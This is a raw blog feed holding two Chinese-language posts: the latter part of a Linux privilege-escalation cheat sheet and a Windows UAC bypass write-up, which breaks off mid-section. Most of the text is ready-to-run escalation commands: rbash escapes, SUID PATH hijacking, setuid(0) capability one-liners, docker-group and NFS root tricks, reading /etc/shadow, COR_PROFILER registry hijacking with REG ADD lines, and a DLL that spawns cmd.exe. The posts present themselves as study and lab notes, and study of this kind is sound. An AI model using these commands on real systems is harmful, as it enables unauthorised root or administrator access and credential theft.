id="scp-bypass"><a href="#scp-bypass" class="headerlink" title="scp bypass"></a>scp bypass</h3><p>我在<a href="http://www.const27.com/2020/07/02/vulnhub-dc-2/%E5%B0%B1%E6%98%AF%E7%94%A8scp%E7%BB%95%E7%9A%84">http://www.const27.com/2020/07/02/vulnhub-dc-2/就是用scp绕的</a></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145419.png" alt="QQ截图20210217145419"></p><h2 id="进入命令自带shell-bypass"><a href="#进入命令自带shell-bypass" class="headerlink" title="进入命令自带shell bypass"></a>进入命令自带shell bypass</h2><p>man,git config help,more,less,vim,vi,ftp,gdb等命令都有自己的shell，我们只需在他们各自的shell中执行/bin/sh即可<br>一般都是在shell键入!/bin/sh来bypass rbash</p><p>下面这种方法也是可行的（似乎仅vim)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;bash</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure><p>执行上面两个语句，就bypass了</p><h2 id="find-bypasss"><a href="#find-bypasss" class="headerlink" title="find bypasss"></a>find bypasss</h2><p>简单概括就是-exec执行一下/bin/bash …</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145437.png" alt="QQ截图20210217145437"></p><h2 id="编程语言-bypass"><a href="#编程语言-bypass" class="headerlink" title="编程语言 bypass"></a>编程语言 bypass</h2><p>python</p><p>如果python都可以用的话，那就更轻松了，os安排一下<br>似乎pty也行?没试</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -a 进入php shell</span><br><span class="line">然后执行命令:exec(&quot;&#x2F;bin&#x2F;bash&quot;);</span><br></pre></td></tr></table></figure><p>perl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>ruby</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;&#39;</span><br></pre></td></tr></table></figure><h2 id="cp-bypass"><a href="#cp-bypass" class="headerlink" title="cp bypass"></a>cp bypass</h2><p>直接用cp把/usr/bin里的命令复制过来就行了</p><h2 id="直接更改PATH-SHELL变量"><a href="#直接更改PATH-SHELL变量" class="headerlink" title="直接更改PATH/SHELL变量"></a>直接更改PATH/SHELL变量</h2><p>键入export -p 查看该用户的变量</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/QQ%E6%88%AA%E5%9B%BE20210217145455.png" alt="QQ截图20210217145455"></p><p>如果这俩变量有w权，那么我们可以直接写入来bypass</p><h2 id="ssh-bypass"><a href="#ssh-bypass" class="headerlink" title="ssh bypass"></a>ssh bypass</h2><p>原理是通过ssh链接当前IP的当前用户并启动/bin/bash</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh username@Ip -t &quot;&#x2F;bin&#x2F;bash&quot;</span><br></pre></td></tr></table></figure><h1 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h1><p>用 uanme -a 查明内核版本</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210311220036263.png" alt="image-20210311220036263"></p><p>然后找exp打就完事了，内核提权的内容有点底层，暂时不用深入了解</p><h1 id="passwd和shadow"><a href="#passwd和shadow" class="headerlink" title="passwd和shadow"></a>passwd和shadow</h1><h2 id="明文密码"><a href="#明文密码" class="headerlink" title="明文密码"></a>明文密码</h2><p>/etc/passwd 默认所有用户可读，但只有root可写。<br>/etc/passwd里的用户口令往往以x代替，其加密后的密码会存入/etc/shadow里面，/etc/shadow默认只有root可读。</p><p>但是有小概率情况，明文密码就直接出现在/etc/passwd了，如果有这个情况且root密码暴露在了passwd里，那么就可以轻而易举提权了</p><h2 id="passwd-可写"><a href="#passwd-可写" class="headerlink" title="passwd 可写"></a>passwd 可写</h2><p>如果/etc/passwd 我们当前用户可写，可以直接把root的密码改成一个明文密码，从而达到提权目的</p><h2 id="爆破shadow"><a href="#爆破shadow" class="headerlink" title="爆破shadow"></a>爆破shadow</h2><p>如果/etc/shadow 可读，我们可以用hashcat或者john暴力破解shadow文件</p><h1 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h1><h2 id="文件重写"><a href="#文件重写" class="headerlink" title="文件重写"></a>文件重写</h2><p>计划任务由crontab管理，非root用户是无法列出root用户的计划任务的，但我们可以列出/etc的系统任务，系统任务默认是root权限运行的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -l &#x2F;etc&#x2F;cron*</span><br></pre></td></tr></table></figure><p>如果我们有幸有权限能更改其中一个任务指定的脚本，我们就可以往脚本里添加如反弹shell等指令，从而提权</p><h2 id="环境变量劫持"><a href="#环境变量劫持" class="headerlink" title="环境变量劫持"></a>环境变量劫持</h2><p>我们查看定时任务</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316125520822.png" alt="image-20210316125520822"></p><p>发现定义了诸多环境变量，如果其任务有未指定绝对路径的指令，如</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">17 *    * * *   root    shell.sh</span><br></pre></td></tr></table></figure><p>而且我们在其环境变量路径中可以进行写入操作，那么我们可以通过写入环境变量的靠前路径一个同名恶意文件从而导致环境变量劫持</p><p>比如我们在/sbin 写入一个 反弹shell功能的shell.sh，那么就可以造成提权</p><h2 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h2><p><a href="https://www.secpulse.com/archives/72965.html">https://www.secpulse.com/archives/72965.html</a> 总结的太好了，我都不想记笔记了（偷懒</p><h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>如果我们找到一个suid权限的程序，但是我们无法完成suid提权，就可以试试搭配环境变量进行提权。</p><p>这个提权方法的思想是，找到有suid的，内部有system函数调用未指定路径的命令的文件。同时用户有修改自己环境变量的权限，</p><p>我们就可以通过劫持system函数里调用的脚本文件，使其指向我们环境变量里自行创建的一个同名脚本文件，那么这个我们自行创建的同名脚本文件就能以root权限运行了，如果这个脚本文件里的命令是/bin/bash，那么就相当于我们提权了。</p><p>可能有点小绕，看下面具体操作就行了。</p><p>实验室配置:</p><p>首先在一个目录下创建如下文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim demo.c</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312183454821.png" alt="image-20210312183454821"></p><p>然后 gcc demo.c -o shell    将其编译为可执行文件</p><p>然后 chmod u+s shell           为其增加suid权限</p><p>攻击者视角:</p><p>首先使用下列指令搜寻suid权限文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" alt="image-20210312184402084"></p><p>发现可疑目标，执行一下看看</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184424019.png" alt="image-20210312184424019"></p><p>发现返回了ps命令的结果，我们可以以此猜测这个文件内部 有 system(“ps”);  这条c语言代码。<br>遂可尝试环境变量提权</p><p>我们依次执行以下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; ps</span><br><span class="line">export $PATH&#x3D;&#x2F;tmp:$PATH        需要修改自身环境变量的权限，但基本上都有这个权限</span><br><span class="line">chmod 777 .&#x2F;ps                 没这条命令会导致提权失败</span><br><span class="line">cd &#x2F;home&#x2F;const27</span><br><span class="line">.&#x2F;shell                        提权成功</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210312184905534.png" alt="image-20210312184905534"></p><h1 id="密码查找"><a href="#密码查找" class="headerlink" title="密码查找"></a>密码查找</h1><p>这个提权技术说白了，就是去到处翻密码</p><h2 id="文件内查找"><a href="#文件内查找" class="headerlink" title="文件内查找"></a>文件内查找</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep --color&#x3D;auto -rnw &#39;&#x2F;&#39; -ie &quot;PASSWORD&quot; --color&#x3D;always 2&gt; &#x2F;dev&#x2F;null</span><br><span class="line">find . -type f -exec grep -i -I &quot;PASSWORD&quot; &#123;&#125; &#x2F;dev&#x2F;null \;</span><br></pre></td></tr></table></figure><p>我们可以通过以上命令，指定关键字，在所有文件中搜索内容中有关键字的文件。</p><h2 id="查找十分钟内更改过的文件"><a href="#查找十分钟内更改过的文件" class="headerlink" title="查找十分钟内更改过的文件"></a>查找十分钟内更改过的文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -mmin -10 2&gt;&#x2F;dev&#x2F;null | grep -Ev &quot;^&#x2F;proc&quot;  (不显示^&#x2F;proc文件或文件夹)</span><br></pre></td></tr></table></figure><h1 id="capabilities"><a href="#capabilities" class="headerlink" title="capabilities"></a>capabilities</h1><p>capabilities 是linux2.2后出现的产物，它的出现一定程度上弥补了suid这种粗糙的权限管理机制，但是capabilities 自身也有造成提权的安全隐患</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>capabilities 把root的权限细分了，可以分别启用或者禁用。</p><p>在进行特权操作的时候，如果euid不是root，那么系统就会检查是否具有执行特权操作的对应capabilities ，并以此为凭据决定特权操作是否能被执行。</p><p>如下是一些常见的特权操作及其对应capabilities </p><table><thead><tr><th>改变文件的所属者(chown())</th><th align="left">CAP_CHOWN</th></tr></thead><tbody><tr><td>向进程发送信号(kill(), signal())</td><td align="left">CAP_KILL</td></tr><tr><td>改变进程的uid(setuid(), setreuid(), setresuid()等)</td><td align="left">CAP_SETUID</td></tr><tr><td>trace进程(ptrace())</td><td align="left">CAP_SYS_PTRACE</td></tr><tr><td>设置系统时间(settimeofday(), stime()等)</td><td align="left">CAP_SYS_TIME</td></tr><tr><td>忽略文件读及目录搜索的DAC访问限制</td><td align="left">CAP_DAC_READ_SEARCH</td></tr></tbody></table><p>关于capabilities的管理工具有如下:</p><ul><li>getcap</li><li>setcap</li><li>capsh</li><li>filecap</li></ul><p>getcap 用于查询capabilities，setcap用于设置capabilities，capsh用于查当前shell进程的capabilities，filecap既能设置又能查询。</p><p>我们可以通过以下指令搜索设置了capabilities的可执行文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure><h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="通过cap-setuid"><a href="#通过cap-setuid" class="headerlink" title="通过cap_setuid"></a>通过cap_setuid</h3><p>cap_setuid 可以设置当前用户的euid，我们可以通过此选项来进行一些提权。</p><p>以python为例</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316201948608.png" alt="image-20210316201948608"></p><p>我们发现python3.8 有cap_setuid权限，那么我们可以用以下指令进行提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316202912697.png" alt="image-20210316202912697"></p><p>类似的有很多。</p><p>perl</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &#39;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;&#x2F;bin&#x2F;sh&quot;;&#39;</span><br></pre></td></tr></table></figure><p>gdb</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb -nx -ex &#39;python import os; os.setuid(0)&#39; -ex &#39;!sh&#39; -ex quit</span><br></pre></td></tr></table></figure><p>php</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &quot;posix_setuid(0); system(&#39;&#x2F;bin&#x2F;sh&#39;);&quot;</span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &#39;import os; os.setuid(0); os.system(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p>rvim</p><p>需要支持python3模块。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rvim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</span><br></pre></td></tr></table></figure><p>vim</p><p>需要支持python3模块。<code>vim --version</code>查询，是否支持py3</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim -c &#39;:py import os; os.setuid(0); os.execl(&quot;&#x2F;bin&#x2F;sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#39;</span><br></pre></td></tr></table></figure><h3 id="通过CAP-DAC-READ-SEARCH"><a href="#通过CAP-DAC-READ-SEARCH" class="headerlink" title="通过CAP_DAC_READ_SEARCH"></a>通过CAP_DAC_READ_SEARCH</h3><p>cap_dac_read_search可以绕过文件的读权限检查以及目录的读/执行权限的检查。</p><p>利用此特性我们可以读取系统中的敏感信息。</p><p>如果tar有此权限，我们可以通过此来查看敏感文件内容。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar cvf shadow.tar &#x2F;etc&#x2F;shadow  &#x2F;&#x2F;创建压缩文件</span><br><span class="line"></span><br><span class="line">tar -xvf shadow.tar  &#x2F;&#x2F;解压缩</span><br><span class="line"></span><br><span class="line">cd etc  &#x2F;&#x2F;进入解压缩的目录</span><br><span class="line"></span><br><span class="line">chmod +r shadow  &#x2F;&#x2F;赋予读权限</span><br><span class="line"></span><br><span class="line">cat shadow | grep root  &#x2F;&#x2F;查看shadow文件的内容</span><br></pre></td></tr></table></figure><h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><h2 id="Docker用户组提权"><a href="#Docker用户组提权" class="headerlink" title="Docker用户组提权"></a>Docker用户组提权</h2><p>如果我们拿到了一个Docker用户组的用户权限，那么我们可以很轻松地完成提权</p><p>首先我们执行如下命令</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -v &#x2F;:&#x2F;mnt --rm -it crf_web1 chroot &#x2F;mnt sh</span><br></pre></td></tr></table></figure><p>然后在其中的/etc/passwd中写入一个root权限用户（我这里直接无密码了）</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316205908273.png" alt="image-20210316205908273"></p><p>然后退出来，直接尝试 su root2</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210316210009057.png" alt="image-20210316210009057"></p><p>提权成功</p><h1 id="NFS"><a href="#NFS" class="headerlink" title="NFS"></a>NFS</h1><p>NFS 是一个用来共享目录的东西，但若配置权限不当则会引发安全问题</p><h2 id="no-root-squash"><a href="#no-root-squash" class="headerlink" title="no_root_squash"></a>no_root_squash</h2><p>我们cat /etc/exports 如果有no_root_squash字样，则说明root用户就会对共享目录拥有至高的权限控制，就像是对本机的目录操作一样。</p><p>也就是说，任何机器的root在此目录上都有最高权限。</p><p>我们在获得一台机器的root权限后，可以通过nfs在另一台低权限机器上实现提权</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir &#x2F;tmp&#x2F;nfs</span><br><span class="line">mount -o rw,vers&#x3D;3 10.10.10.10:&#x2F;tmp &#x2F;tmp&#x2F;nfs 将本机上的&#x2F;tmp&#x2F;nfs 挂载到共享目录</span><br><span class="line">cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;nfs&#x2F;bash</span><br><span class="line">chmod u+s &#x2F;tmp&#x2F;nfs&#x2F;bash  设置共享目录上bash的suid</span><br></pre></td></tr></table></figure><p>回到低权限机，执行 /tmp/bash  完成提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;sudo-和-suid-提权&quot;&gt;&lt;a href=&quot;#sudo-和-suid-提权&quot; class=&quot;headerlink&quot; title=&quot;sudo 和 suid 提权&quot;&gt;&lt;/a&gt;sudo 和 suid 提权&lt;/h1&gt;&lt;h2 id=&quot;何为suid&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="提权" scheme="http://const27.com/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
  <entry>
    <title>BypassUAC技术总结</title>
    <link href="http://const27.com/2021/06/28/Bypass%20UAC/"/>
    <id>http://const27.com/2021/06/28/Bypass%20UAC/</id>
    <published>2021-06-28T13:52:05.780Z</published>
    <updated>2021-06-28T13:40:35.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>用户帐户控制（User Account Control，简写作UAC)是<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">微软</a>公司在其[Windows Vista](<a href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)及更高版本操作系统中采用的一种控制机制，保护系统进行不必要的更改，提升操作系统的稳定性和安全性。<br>管理员在正常情况下是以低权限运行任务的，这个状态被称为被保护的管理员。但当管理员要执行高风险操作（如安装程序等），就需要提升权限去完成这些任务。这个提升权限的过程通常是这样的，相信各位都眼熟过。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" alt="image-20210227191310985"></p><p>点击“是”，管理员就会提升到高权限再去运行该任务。</p><h1 id="autoElevate与requestedExecutionLevel"><a href="#autoElevate与requestedExecutionLevel" class="headerlink" title="autoElevate与requestedExecutionLevel"></a>autoElevate与requestedExecutionLevel</h1><h2 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h2><p>当某个EXE文件的文件清单里有&lt;autoElevate&gt; 元素时，当执行该文件时会默认提权执行。<br>我们劫持该exe文件的dll，可以达到Bypass UAC提权的目的。<br>适用范围:管理员权限以获得，要得到高权限管理员权限</p><p>一般用工具sigcheck检测</p><p>网上常拿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe 举列子</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" alt="image-20210301000136728"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" alt="image-20210301000141880"></p><p>这个东西很有用，是下面部分方法的前提条件</p><h2 id="requestedExecutionLevel"><a href="#requestedExecutionLevel" class="headerlink" title="requestedExecutionLevel"></a>requestedExecutionLevel</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" alt="image-20210302125607741"></p><p>有三个不同的参数：asInvoker requireAdministrator highestAvailable 分别对应应用程序以什么权限运行</p><p>asInvoker：父进程是什么权限，此应用程序就是什么权限</p><p>requireAdministrator：需要以管理员权限来运行，此类应用程序图标右下方会有个盾牌标记<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" alt="image-20210302125851318"></p><p>highestAvailable：此程序以当前用户能获取到的最高权限运行。当你在管理员账户下运行此程序就会要求权限提升以及弹出UAC框。当你在标准账户下运行此程序，由于此账户的最高权限就是标准账户，所以双击便运行</p><h1 id="白名单程序"><a href="#白名单程序" class="headerlink" title="白名单程序"></a>白名单程序</h1><p>除了刚刚说的autoelevate，还有一类叫白名单程序的应用程序也是打开默认提权的。如服务管理工具下的许多应用都属于白名单程序，而其中又有些程序执行时需要依赖CLR支持（如事件查看器，任务计划程序）</p><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="DLL劫持"><a href="#DLL劫持" class="headerlink" title="DLL劫持"></a>DLL劫持</h2><p>reference:<a href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>exe文件运行时会加载许多dll文件，这些dll文件的加载顺序是</p><ul><li><p>程序所在目录</p></li><li><p>系统目录即<code>SYSTEM32</code>目录</p></li><li><p>16位系统目录即<code>SYSTEM</code>目录</p></li><li><p><code>Windows</code>目录</p></li><li><p>程序加载目录(<code>SetCurrentDirecctory</code>)</p></li><li><p><code>PATH</code>环境变量中列出的目录</p><p>同时，dll加载也遵循着<code>Know DLLs注册表项</code>的机制：Know DLLs注册表项指定的DLL是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。在注册表HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLS处可以看见这些dll</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" alt="image-20210301184035776"></p></li></ul><p>在knowdlls表项中的dll是预先就加载进内存空间的，被诸多应用调用着，改动需要高权限。</p><p>如果我们在应用程序找到正确的dll之前，将我们自己创造的dll放入优先级更高的搜索目录让应用程序优先加载此dll文件，这就造成了dll劫持。但这只是dll劫持的其中一种途径，他有这些途径：</p><p>（1） DLL替换：用恶意的DLL替换掉合法的DLL<br>（2） DLL搜索顺序劫持：当应用程序加载DLL的时候，如果没有带指定DLL的路径，那么程序将会以特定的顺序依次在指定的路径下搜索待加载的DLL。通过将恶意DLL放在真实DLL之前的搜索位置，就可以劫持搜索顺序，劫持的目录有时候包括目标应用程序的工作目录。<br>（3） 虚拟DLL劫持：释放一个恶意的DLL来代替合法应用程序加载的丢失/不存在的DLL<br>（4） DLL重定向：更改DLL搜索的路径，比如通过编辑%PATH%环境变量或 .exe.manifest/.exe.local文件以将搜索路径定位到包含恶意DLL的地方。<br>（5） WinSxS DLL替换：将目标DLL相关的WinSxS文件夹中的恶意DLL替换为合法的DLL。此方法通常也被称为DLL侧加载<br>（6） 相对路径DLL劫持：将合法的应用程序复制（并有选择地重命名）与恶意的DLL一起放入到用户可写的文件夹中。在使用方法上，它与（签名的）二进制代理执行有相似之处。它的一个变体是（有点矛盾地称为）“自带LOLbin”，其中合法的应用程序带有恶意的DLL（而不是从受害者机器上的合法位置复制）。</p><h4 id="实践出真知1"><a href="#实践出真知1" class="headerlink" title="实践出真知1"></a>实践出真知1</h4><p>这里我们先用第一种方法来进行实验，实验对象是C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe和Listary。Listary是一个很好用的检索小工具，我通过processmonitor，设置好过滤条件，查看SystemPropertiesAdvanced.exe调用的dll时发现它会调用一个Listary下的一个名为ListaryHook.dll的dll。<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" alt="image-20210302132631680"></p><p>由于listary目录权限不高，我们可以直接替换该dll，换成dllmain为打开cmd的dll。然后点击运行SystemPropertiesAdvanced.exe，就会发现会弹出高权限cmd窗口<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" alt="image-20210302132724843"></p><p>bypassuac成功。 当然这种都不能算是一个洞，listary并不是人人电脑上都有的，而且这个软件装机量应该是极少数少的，所以这里只是提供一个思路，这种洞该怎么去找。</p><h4 id="实践出真知2"><a href="#实践出真知2" class="headerlink" title="实践出真知2"></a>实践出真知2</h4><p>这里使用第三种方法进行实验，实验对象是eventvwr.msc，它是管理工具中的事件查看器，它依赖于mmc.exe来运行。比如，你想运行它，就得通过mmc eventvwr.msc来运行它,并且在process exploer中只能看到个mmc.exe。</p><p>我们process monitor设置过滤如下</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" alt="image-20210302205938167"></p><p>cmd运行 mmc eventvwr.msc,查看调用</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" alt="image-20210302210053342"></p><p>dll搜索顺序确实是 程序目录-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;当前目录（这里也是SYSTEM32目录，我认为的原因是mmc会自动提升权限导致当前目录为System32导致的）-&gt;PATH目录。</p><p>我们只需在可写目录下植入名为elsext.dll的恶意dll，处理好dll的dllmain函数，就能让dllmain里的指令被高权限执行</p><p>但是无奈我这里环境是win7 sp1,但是这个洞7600才出现，所以复现不了了。但大概思路就是这样的</p><h2 id="CLR加载任意DLL"><a href="#CLR加载任意DLL" class="headerlink" title="CLR加载任意DLL"></a>CLR加载任意DLL</h2><p>CLR是微软为.net运行时提供的环境，像java的虚拟机一样，而clr有一个Profiling机制。这个机制简而言之便是可以给CLR提供一个dll，当任何高权限.NET运行时都会主动加载该DLL，我们可以构造恶意dll给CLR加载，从而获得高权限的进程如cmd，从而bypassuac。</p><p>至于这个dll如何给CLR，是通过修改以下环境变量实现的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING &#x3D; 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure><p>CLR会检查环境变量中的COR_ENABLE_PROFILING，若为1则检查通过，进行下一步。<br>在net4.0以前，若检查通过，会马上去查找COR_PROFILER指定的注册表项，找到其dll路径并加载<br>net4.0后，会先查找COR_PROFILER_PATH是否指定dll文件路径，若没有再去查找COR_PROFILER指定的注册表项，找到其dll路径并加载。<br>总而言之，我们设置好COR_ENABLE_PROFILING和COR_PROFILER两个项就可以了。</p><p>接下来我们设置用户环境变量，设置用户环境变量时不需要高权限（win10似乎设置系统环境变量也不需要）。<br>以及在注册表，在指定的CLSID属性下新建Inprocserver32项，并写入恶意dll路径. 然后通过mmc调用一下gpedit.msc这种程序，即可以高权限执行dll。如果dll执行命令为system(“cmd.exe”)  那么就会蹦出来高权限cmd窗口</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\test\calc.dll&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure><p>但我死活复现不起不知道为啥，我的dll这样写的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外的，你还可以为COR_PROFILER_PATH设置为如\\server\share\test.dll的smb的路径，这样也可以实现bypassuac（没复现）</p><h2 id="白名单程序-1"><a href="#白名单程序-1" class="headerlink" title="白名单程序"></a>白名单程序</h2><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>这个方法很简单。打开C:\Windows\system32\odbcad32.exe，然后通过以下方法打开powershell或者cmd</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" alt="image-20210302133941728"></p><p>成功bypass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" alt="image-20210302134014137"></p><h3 id="管理工具"><a href="#管理工具" class="headerlink" title="管理工具"></a>管理工具</h3><p>之前说过，管理工具有很多白名单程序，如果一个白名单程序有浏览文件目录的功能，就可以以此来创建高权限cmd窗口。这里拿事件查看器举例</p><p>操作-》打开保存的目录-》文件目录路径处输入powershell-》弹出高权限powershell    以此内推，还有很多相似的管理工具可以这样利用</p><h2 id="注册表劫持"><a href="#注册表劫持" class="headerlink" title="注册表劫持"></a>注册表劫持</h2><h3 id="Fodhelper-exe"><a href="#Fodhelper-exe" class="headerlink" title="Fodhelper.exe"></a>Fodhelper.exe</h3><p>Fodhelper.exe win10才有，所以只有win10能通过这个办法bypassuac，他是一个autoelevate元素程序</p><p>我们使用proceemonitor查看事件查看器启动的时候执行了什么。我们通过排查发现了此处</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302194843185.png" 